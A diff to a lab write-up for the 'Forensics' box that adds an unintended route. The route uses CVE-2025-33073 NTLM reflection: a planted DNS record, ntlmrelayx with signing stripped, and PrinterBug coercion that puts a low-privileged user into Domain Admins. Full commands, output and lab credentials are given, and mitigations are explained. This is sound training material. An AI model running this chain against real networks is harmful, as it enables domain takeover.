@@ -2,7 +2,7 @@
 title: Forensics
 date: 2026-09-08 14:00:00 +0000
 categories: [HacksmarterLabs]
-tags: [windows, active-directory, kerberoasting, targeted-kerberoasting, password-cracking, bloodhound, evil-winrm, office-password-cracking, hardcoded-credentials, credential-reuse, access-token, weak-service-permissions, privilege-escalation, mimikatz, lsa-dump, pass-the-hash, kerberos, dcsync, secretsdump, impacket, dpapi, domain-compromise]
+tags: [windows, active-directory, kerberoasting, targeted-kerberoasting, password-cracking, bloodhound, evil-winrm, office-password-cracking, hardcoded-credentials, credential-reuse, access-token, weak-service-permissions, privilege-escalation, mimikatz, lsa-dump, pass-the-hash, kerberos, dcsync, secretsdump, impacket, dpapi, ntlm-relay, ntlm-reflection, printerbug, dns-dynamic-update, cve, domain-compromise]
 media_subpath: /images/hacksmarter_forensics/
 image:
   path: 'https://images.coursestack.com/a8cc9a47-2b72-4c62-8d8a-79fa5e9212fc/585271ad-2cef-4f59-aefd-4b49ae82c9a8'
@@ -773,16 +773,124 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
 [*] Cleaning up...
 ```
 
-The domain Administrator NT hash is the domain-compromise deliverable; from here, pass-the-hash to `DC01` reads the flag from Administrator's desktop and the box is done.
+The domain Administrator NT hash is the whole deliverable; the lab does not ask for a flag file on top of it.
 
 > The reason the SOC's own captured ticket rehydrates the compromise is that TGTs, by default, live for ten hours and are entirely portable once written to disk. There is nothing on `DC01` for the domain admin to change to invalidate that specific ticket, short of resetting `krbtgt` (twice), and even then only tickets encrypted with the old key would break. Treat kirbi/ccache artifacts as if they *are* the credential.
 {: .prompt-danger }
 
 ---
 
+## 10. Unintended Route: shannon Straight to Domain Admin
+
+The chain above is the intended one, and it is the reason the box is called "Forensics". None of it is actually necessary. A single AD misconfiguration on `DC01` collapses the entire chain into three commands run from the attacker box, using only the starting `shannon` credential.
+
+### The primitive
+
+Two facts about `LAINOSCP.local` compose into an unintended domain-compromise:
+
+1. **AD-integrated DNS zone.** Any authenticated user can create a DNS record in the domain zone by default, because the zone object's DACL grants `Authenticated Users` the `Create Child` right. `bloodyAD add dnsRecord` writes it through LDAP.
+2. **Print Spooler is enabled on the DC.** `MS-RPRN`'s `RpcRemoteFindFirstPrinterChangeNotificationEx` is a coercion primitive, the classic "PrinterBug", that makes the spooler service on `DC01` open an outbound SMB session to any name we hand it.
+
+Those two on their own are old news. What matters here is that LDAP on `DC01` requires signing (`smb2-security-mode: Message signing enabled and required` in the DC scan), which is exactly what has kept "coerce and relay to LDAP" from working since 2019 or so. **[CVE-2025-33073](/theory/windows/AD/relay/#reflection-attacks)** breaks that.
+
+CVE-2025-33073's trick is a specifically-shaped **hostname**. If the label the SMB client is forced to authenticate to ends in a marshalled `CredMarshalTargetInfo` (CMTI) blob, SSPI treats the outbound authentication as loopback, and its signing/sealing flags become negotiable rather than fixed. `ntlmrelayx.py --remove-sign-seal` then strips the signing bit on the relayed leg. The MIC still verifies because the "loopback" code path never bound the flags into it. The full mechanism (blob format, why the SPN canonicalisation lets it through) is on the [relay theory page](/theory/windows/AD/relay/); this box just uses the standard PoC hostname.
+
+### Plant the DNS record
+
+The minimal CMTI blob from the decoder.cloud PoC (`1UWhRCA` plus padding and the SPN class tag) prepended with `localhost` is enough. Write an A record for it, pointing at the tun0 IP the attacker box is reachable on:
+
+```bash
+export USERAD=shannon
+export PASS=GoldSeagull123
+bloodyAD -u $USERAD -p $PASS -d $DOMAIN --host $FQDN \
+    add dnsRecord --dnstype A \
+    localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
+    $(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1)
+```
+
+`shannon` has no directory rights beyond the default `Authenticated Users` grant on the zone; the write goes through anyway because the default ACL never was tightened.
+
+### Stand up the relay
+
+[ntlmrelayx.py](https://github.com/fortra/impacket) from Impacket, `--remove-sign-seal` to strip signing on the LDAP leg, `-i` to open an interactive LDAP shell locally instead of firing a one-shot payload:
+
+```bash
+sudo $(which ntlmrelayx.py) -t ldap://DC01.lainoscp.local \
+    --remove-sign-seal -smb2support -i
+```
+
+### Coerce DC01 to authenticate to us
+
+`shannon`'s credential is enough to call `RpcRemoteFindFirstPrinterChangeNotificationEx` on `DC01`'s spooler. [coercer](https://github.com/p0dalirius/Coercer) is the cleanest driver for this, its `-l` flag is the label the spooler will open a UNC to (our CMTI hostname), `--auth-type smb` picks the transport:
+
+```bash
+uvx coercer coerce \
+    -l 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' \
+    -d $DOMAIN -u $USERAD -p $PASS -t $FQDN --auth-type smb
+```
+
+```text
+[+] DCERPC port '49675' is accessible!
+   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
+      [>] MS-RPRN--RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA\x00')
+      [>] MS-RPRN--RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine='\\localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA\x00')
+```
+
+`NO_AUTH_RECEIVED` is expected on coercer's side, coercer only cares that the RPC call returned, not about the resulting SMB auth. Look at the ntlmrelayx window:
+
+```text
+[*] Servers started, waiting for connections
+[*] (SMB): Received connection from 10.1.135.195, attacking target ldap://DC01.lainoscp.local
+[-] (SMB): Authenticating against ldap://DC01.lainoscp.local as LAINOSCP/DC01$ FAILED
+[*] (SMB): Received connection from 10.1.135.195, attacking target ldap://DC01.lainoscp.local
+[-] (SMB): Authenticating against ldap://DC01.lainoscp.local as LAINOSCP/DC01$ FAILED
+[*] (SMB): Received connection from 10.1.135.195, attacking target ldap://DC01.lainoscp.local
+[*] (SMB): Authenticating connection from /@10.1.135.195 against ldap://DC01.lainoscp.local SUCCEED [1]
+[*] ldap:///@dc01.lainoscp.local [1] -> Started interactive Ldap shell via TCP on 127.0.0.1:11000 as /
+```
+
+The first two attempts show `LAINOSCP/DC01$` and fail; those are the spooler's stock authentications where signing/sealing negotiation makes the MIC unforgeable. The third attempt is the CMTI-tagged one; ntlmrelayx recognises the loopback semantics, strips the signing flags, and LDAP accepts the bind (`SUCCEED [1]`). The identity string collapses to a blank `/@10.1.135.195` because at that point the connection is authenticated as `DC01$` but the loopback state means the server is treating the source as itself.
+
+### Land in the LDAP shell and pivot
+
+```bash
+nc 127.0.0.1 11000
+```
+
+```text
+Type help for list of commands
+
+# whoami
+u:NT AUTHORITY\SYSTEM
+```
+
+`DC01$` in the AD LDAP context resolves to `NT AUTHORITY\SYSTEM`, which is the highest-privilege principal there is. That means every LDAP write, including group-membership changes on the built-in privileged groups, goes through unconditionally. Add `shannon` to `Domain Admins`:
+
+```text
+# add_user_to_group shannon "domain admins"
+Adding user: shannon to group Domain Admins result: OK
+```
+
+Verify from the attacker box:
+
+```bash
+nxc smb $FQDN -u shannon -p GoldSeagull123
+```
+
+```text
+SMB  10.1.135.195  445  DC01  [+] LAINOSCP.local\shannon:GoldSeagull123 (Pwn3d!)
+```
+
+`Pwn3d!` on the DC over SMB using only the starting `shannon` credential. The Access database, the wuauserv abuse, the LSA secret, the LSASS dump on `FORENSICS01`, and the `iocs` folder pass-the-ticket are all unnecessary if the objective is only the hash.
+
+> A single 2025 CVE composes with two defaults (Authenticated-Users write on the DNS zone, and Spooler on the DC) into a one-step domain compromise from any low-privileged domain user. The mitigation is not to patch CVE-2025-33073 alone: an EPA-and-channel-binding requirement on LDAP would prevent this path even on an unpatched host. Locking down the DNS zone ACL and stopping Spooler on DCs are the other two knobs.
+{: .prompt-danger }
+
+---
+
 ## Understanding the Attack Chain
 
-Every rung on this chain is a Windows feature or forensic artifact used as designed; nothing on this box relies on a CVE. The table separates the severity each primitive carries alone from what it is worth once composed with the ones before it.
+Every rung on the intended chain is a Windows feature or forensic artifact used as designed; the unintended route above is the only rung that depends on a CVE. The table separates the severity each primitive carries alone from what it is worth once composed with the ones before it.
 
 | Primitive | Where it lives | Severity in isolation | Severity composed |
 |---|---|---|---|
